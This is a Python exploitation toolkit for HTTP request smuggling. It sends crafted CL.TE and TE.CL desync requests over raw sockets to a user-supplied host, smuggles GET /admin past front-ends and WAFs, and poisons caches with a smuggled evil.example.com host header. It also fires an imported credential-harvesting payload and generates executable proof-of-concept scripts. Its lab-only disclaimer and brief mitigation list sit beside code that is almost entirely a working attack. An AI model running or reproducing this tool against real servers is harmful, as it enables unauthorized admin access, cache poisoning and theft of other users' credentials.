#!/usr/bin/env python3
"""
HTTP Request Smuggling Exploitation Toolkit
Project #35: HTTP Request Smuggling & Desync Attacks

LEGAL: Only test your own apps, PortSwigger labs, or your own infra.
"""

import sys
import os
import re
import json
import time
import socket
import argparse
import datetime

from smuggling_payloads import (
    SMUGGLING_TECHNIQUES, RESPONSE_SIGNATURES,
    python_poc, curl_poc,
    WAF_BYPASS_PAYLOAD, CACHE_POISON_PAYLOAD, CRED_HARVEST_PAYLOAD,
)

class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD    = '\033[1m'
    RESET   = '\033[0m'

class SmugglingToolkit:
    def __init__(self, host, port=80, use_tls=False, timeout=8,
                 output_dir='.', verbose=False):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.output_dir = output_dir
        self.verbose = verbose

        os.makedirs(f"{output_dir}/smuggling_pocs", exist_ok=True)

        self.results = {
            'target': f"{'https' if use_tls else 'http'}://{host}:{port}",
            'timestamp': datetime.datetime.now().isoformat(),
            'vulnerable': False,
            'tests': [],
            'findings': [],
            'pocs': [],
            'error': None,
        }

    def _send_raw(self, payload, keep_alive=False, read_timeout=None):
        to = read_timeout or self.timeout
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            s.connect((self.host, self.port))

            if self.use_tls:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=self.host)

            s.sendall(payload)
            response = b''
            start = time.time()
            try:
                while len(response) < 65536:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if not keep_alive and b'\r\n\r\n' in response:
                        break
            except socket.timeout:
                pass
            elapsed = time.time() - start
            s.close()
            return response, elapsed
        except Exception as e:
            if self.verbose:
                print(f"{Colors.YELLOW}[!] {str(e)[:80]}{Colors.RESET}")
            return None, 0

    def _baseline(self):
        req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        return self._send_raw(req)

    def phase1_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 1: VULNERABILITY DETECTION{Colors.RESET}")
        print(f"    Target: {self.host}:{self.port}")

        baseline, base_time = self._baseline()
        if baseline is None:
            print(f"{Colors.RED}[!] Cannot reach target{Colors.RESET}")
            self.results['error'] = 'unreachable'
            return False

        print(f"    [BASELINE] {baseline[:40]!r}, {base_time:.2f}s")

        for name, fn in SMUGGLING_TECHNIQUES.items():
            print(f"\n    [{name.upper()}] Sending crafted request...")
            payload = fn()
            response, elapsed = self._send_raw(payload, keep_alive=True, read_timeout=3)

            if response is None:
                print(f"      {Colors.YELLOW}[~]{Colors.RESET} no response")
                continue

            status_line = response[:50].decode('utf-8', errors='ignore')
            body = response.decode('utf-8', errors='ignore')

            suspicious = False
            reasons = []

            if elapsed > base_time + 2.0:
                suspicious = True
                reasons.append(f'time delay {elapsed:.2f}s')

            if 'ADMIN' in body.upper():
                suspicious = True
                reasons.append('admin content reflected')

            for sig_name, pattern in RESPONSE_SIGNATURES.items():
                if re.search(pattern, body, re.IGNORECASE):
                    if sig_name in ('admin_access', 'smuggling_error'):
                        suspicious = True
                        reasons.append(sig_name)

            test_result = {
                'technique': name,
                'status': status_line.strip(),
                'elapsed': round(elapsed, 3),
                'suspicious': suspicious,
                'reasons': reasons,
            }
            self.results['tests'].append(test_result)

            if suspicious:
                print(f"      {Colors.RED}[+]{Colors.RESET} POSSIBLE SMUGGLING — "
                      f"{', '.join(reasons)}")
                self.results['findings'].append({
                    'type': f'{name}_suspicious',
                    'reasons': reasons,
                    'elapsed': round(elapsed, 3),
                })
                self.results['vulnerable'] = True
            else:
                print(f"      {Colors.YELLOW}[~]{Colors.RESET} {status_line[:40]} "
                      f"({elapsed:.2f}s)")

        return self.results['vulnerable']

    def phase2_desync(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 2: DESYNC TESTING{Colors.RESET}")

        smuggled = f"GET /admin HTTP/1.1\r\nHost: {self.host}\r\n\r\n"
        body = "0\r\n\r\n" + smuggled

        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{body}"
        ).encode()

        print(f"    Sending prefix-smuggle payload...")
        r, elapsed = self._send_raw(payload, keep_alive=True, read_timeout=3)

        if r:
            body_text = r.decode('utf-8', errors='ignore')
            print(f"    Response preview: {body_text[:200]!r}")

            if 'ADMIN' in body_text.upper():
                print(f"    {Colors.RED}[+]{Colors.RESET} ADMIN CONTENT LEAKED via smuggling!")
                self.results['findings'].append({
                    'type': 'desync_admin',
                    'detail': 'Smuggled GET /admin returned admin content',
                    'response': body_text[:500],
                })
                self.results['vulnerable'] = True
            else:
                print(f"    {Colors.YELLOW}[~]{Colors.RESET} no admin leak")

        print(f"\n    Sending suffix-smuggle payload...")
        r, elapsed = self._send_raw(CRED_HARVEST_PAYLOAD.encode(),
                                     keep_alive=True, read_timeout=3)
        if r:
            print(f"    Response: {r[:150]!r}")

    def phase3_cache_poison(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 3: CACHE POISONING VIA SMUGGLING{Colors.RESET}")

        r, elapsed = self._send_raw(CACHE_POISON_PAYLOAD.encode(),
                                     keep_alive=True, read_timeout=3)
        if r is None:
            print(f"    {Colors.YELLOW}[~] no response{Colors.RESET}")
            return

        print(f"    Poison response: {r[:200]!r}")

        # Clean request — check if poison persisted
        clean = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        r2, _ = self._send_raw(clean)
        body2 = r2.decode('utf-8', errors='ignore') if r2 else ''

        if 'evil.example.com' in body2:
            print(f"    {Colors.RED}[+]{Colors.RESET} CACHE POISONED!")
            self.results['findings'].append({
                'type': 'cache_poison_via_smuggling',
                'detail': 'Clean request reflects smuggled X-Forwarded-Host',
            })
            self.results['vulnerable'] = True
        else:
            print(f"    {Colors.YELLOW}[~]{Colors.RESET} not poisoned")

    def phase4_waf_bypass(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 4: WAF BYPASS VIA SMUGGLING{Colors.RESET}")

        # Normal request
        normal = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        r_normal, _ = self._send_raw(normal)
        if r_normal:
            print(f"    Normal /admin:    {r_normal[:80]!r}")

        # Smuggled request — CL.TE
        smuggled_req = f"GET /admin HTTP/1.1\r\nHost: {self.host}\r\n\r\n"
        body = "0\r\n\r\n" + smuggled_req
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{body}"
        ).encode()

        r_smuggled, _ = self._send_raw(payload, keep_alive=True, read_timeout=3)

        if r_smuggled:
            text = r_smuggled.decode('utf-8', errors='ignore')
            print(f"    Smuggled response: {text[:200]!r}")

            if 'ADMIN' in text.upper():
                print(f"    {Colors.RED}[+]{Colors.RESET} ADMIN CONTENT LEAKED via smuggling!")
                self.results['findings'].append({
                    'type': 'admin_access_via_smuggling',
                    'detail': 'CL.TE smuggled GET /admin — admin content returned',
                    'response': text[:500],
                })
                self.results['vulnerable'] = True
            else:
                print(f"    {Colors.YELLOW}[~]{Colors.RESET} no admin leak")

    def phase5_pocs(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 5: POC GENERATION{Colors.RESET}")

        for technique in ['cl_te', 'te_cl', 'te_te_obfuscated']:
            py_content = python_poc(self.host, self.port, technique)
            py_path = f"{self.output_dir}/smuggling_pocs/poc_{technique}.py"
            with open(py_path, 'w') as f:
                f.write(py_content)
            os.chmod(py_path, 0o755)

            sh_content = curl_poc(self.host, self.port, technique)
            sh_path = f"{self.output_dir}/smuggling_pocs/poc_{technique}.sh"
            with open(sh_path, 'w') as f:
                f.write(sh_content)
            os.chmod(sh_path, 0o755)

            print(f"      {Colors.GREEN}✓{Colors.RESET} poc_{technique}.py")
            print(f"      {Colors.GREEN}✓{Colors.RESET} poc_{technique}.sh")

            self.results['pocs'].append({
                'name': technique, 'python': py_path, 'shell': sh_path,
            })

    def save_reports(self):
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        json_path = f"{self.output_dir}/smuggling_report_{ts}.json"
        with open(json_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"\n{Colors.GREEN}[✓] JSON report: {json_path}{Colors.RESET}")

    def print_summary(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] EXPLOITATION SUMMARY{Colors.RESET}")
        print(f"    Vulnerability:  HTTP Request Smuggling")
        print(f"    Tests run:      {len(self.results['tests'])}")
        print(f"    Findings:       {len(self.results['findings'])}")
        print(f"    PoCs generated: {len(self.results['pocs'])}")

        sev_color = Colors.RED if self.results['vulnerable'] else Colors.GREEN
        sev = 'CRITICAL' if self.results['vulnerable'] else 'LOW'
        print(f"    Severity:       {sev_color}{sev}{Colors.RESET}")

        if self.results['findings']:
            print(f"\n    {Colors.RED}Findings:{Colors.RESET}")
            for f in self.results['findings']:
                print(f"        - {f['type']}: {f.get('detail', '')[:80]}")

        print(f"\n    {Colors.YELLOW}Mitigation:{Colors.RESET}")
        print(f"        1. Use HTTP/2 end-to-end")
        print(f"        2. Normalize requests (reject ambiguous CL/TE)")
        print(f"        3. Disable Transfer-Encoding if not needed")
        print(f"        4. Consistent parsing between frontend/backend")
        print(f"        5. WAF with smuggling rules")

    def run(self):
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.MAGENTA}HTTP Request Smuggling Exploitation Toolkit{Colors.RESET}")
        print("=" * 70)
        print(f"{Colors.BOLD}Target: {self.host}:{self.port}{Colors.RESET}")

        self.phase1_detection()
        self.phase2_desync()
        self.phase3_cache_poison()
        self.phase4_waf_bypass()
        self.phase5_pocs()

        self.print_summary()
        self.save_reports()

def main():
    p = argparse.ArgumentParser(
        description="HTTP Request Smuggling Toolkit (Project #35)",
    )
    p.add_argument('host', help='Target hostname')
    p.add_argument('--port', type=int, default=80)
    p.add_argument('--tls', action='store_true', help='Use TLS')
    p.add_argument('--timeout', type=int, default=8)
    p.add_argument('-o', '--output', default='.')
    p.add_argument('-v', '--verbose', action='store_true')

    args = p.parse_args()

    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("=" * 70)
    print("  HTTP REQUEST SMUGGLING EXPLOITATION")
    print("  Project #35: Request Smuggling & Desync Toolkit")
    print("=" * 70)
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  Legal: Only test your own apps, PortSwigger labs, or your own infra.{Colors.RESET}\n")

    toolkit = SmugglingToolkit(
        host=args.host,
        port=args.port,
        use_tls=args.tls,
        timeout=args.timeout,
        output_dir=args.output,
        verbose=args.verbose,
    )
    toolkit.run()

if __name__ == '__main__':
    main()